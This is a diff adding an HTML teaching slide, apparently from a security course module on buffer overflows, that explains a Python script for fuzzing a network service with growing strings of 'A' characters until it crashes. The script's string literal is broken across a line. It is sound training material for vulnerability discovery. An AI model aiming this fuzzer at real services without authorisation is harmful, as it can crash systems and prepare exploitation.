@@ -1,0 +1,72 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light">
+  <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4">
+    <span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 4.2</span>
+    <span>›</span>
+    <span>Identifying Buffer Overflow Vulnerabilities</span>
+    <span>›</span>
+    <span class="text-slate-700">Python Fuzzing Script</span>
+  </div>
+  <div class="flex-grow flex flex-col lg:flex-row gap-6">
+    <div class="lg:w-1/2 flex flex-col justify-center">
+      <div class="text-sm font-bold uppercase tracking-wider text-amber-600 mb-2">Code Walkthrough</div>
+      <h1 class="text-3xl font-bold text-slate-800 mb-3">Python Fuzzing Script</h1>
+      <p class="text-lg font-medium text-slate-600 mb-6">Automating data injection for vulnerability discovery.</p>
+      <div class="text-base text-slate-700 leading-relaxed space-y-3">
+        <p>This Python script automates sending data to a network service to find buffer overflows.</p>
+        <p>It defines target IP, port, and a command prefix.</p>
+        <p>It iteratively sends increasing amounts of 'A' characters, starting from a defined size and incrementing until a maximum size is reached.</p>
+        <p>A socket connection is established for each payload, and the script monitors for connection errors or timeouts, which indicate a potential crash.</p>
+      </div>
+    </div>
+    <div class="lg:w-1/2 flex items-center justify-center">
+      <div class="w-full h-full rounded-xl border border-slate-200 bg-gray-800 shadow-md flex flex-col justify-center items-center p-4 overflow-hidden">
+        <pre class="text-xs text-green-400 font-mono w-full h-full overflow-auto p-4" style="white-space: pre-wrap; tab-size: 2;">
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+
+# Target information
+IP = "192.168.1.100"  # Replace with your target IP
+PORT = 9999           # Replace with your target port
+PREFIX = "OVERFLOW " # Command prefix
+
+# Fuzzing parameters
+start_size = 100
+increment_by = 100
+max_size = 5000
+
+print(f"[*] Fuzzing {IP}:{PORT} with prefix '{PREFIX}'")
+
+string = ""
+while len(string) < max_size:
+    string += "A" * increment_by
+    payload = PREFIX + string
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((IP, PORT))
+        print(f"[*] Sending payload of size {len(string)} bytes...")
+        s.send(bytes(payload + "\r
+", "latin-1"))
+        s.recv(1024)
+        s.close()
+        time.sleep(1)
+    except socket.error as e:
+        print(f"[!] Connection failed or timed out at size {len(string)}: {e}")
+        print("[!] The target server likely crashed. Check your debugger!")
+        sys.exit(0)
+
+print("[*] Fuzzing completed without a crash.")
+        </pre>
+    </div>
+  </div>
+</div>
+<div class="mt-auto pt-4">
+  <div class="rounded-xl border-l-4 border-l-emerald-500 bg-emerald-50 p-3">
+    <div class="text-[10px] font-bold uppercase tracking-wider text-emerald-700 mb-1">Key Takeaway</div>
+    <p class="text-xs font-medium text-slate-800">This Python script automates the fuzzing process by iteratively sending larger payloads to a target network service.</p>
+  </div>
+<style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
